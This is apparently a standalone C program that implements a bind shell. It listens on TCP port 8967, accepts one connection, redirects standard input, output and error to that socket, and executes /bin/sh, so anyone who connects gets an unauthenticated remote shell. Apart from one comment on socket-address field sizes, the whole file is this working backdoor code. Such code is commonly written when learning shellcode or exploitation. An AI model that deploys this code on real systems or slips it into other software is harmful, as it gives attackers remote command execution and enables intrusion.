#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>


int main()
{
  int sock1 = socket(AF_INET, SOCK_STREAM, 0);

  struct sockaddr_in addr;
  int sockaddr_len = sizeof(addr);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(8967);
  addr.sin_addr.s_addr = INADDR_ANY;
  bzero(&addr.sin_zero, 8);

    /*
    sin_family (2 bytes)
    sin_port (2 bytes)
    sin_addr (4 bytes)
    sin_zero (8 bytes)
    */

  bind(sock1, (struct sockaddr *) &addr, sockaddr_len);

  listen(sock1, 0);

  int sock2 = accept(sock1, (struct sockaddr *) &addr, &sockaddr_len);

  close(sock1);

  dup2(sock2, 0);
  dup2(sock2, 1);
  dup2(sock2, 2);

  execve("/bin/sh", NULL, NULL);

  return 0;
}
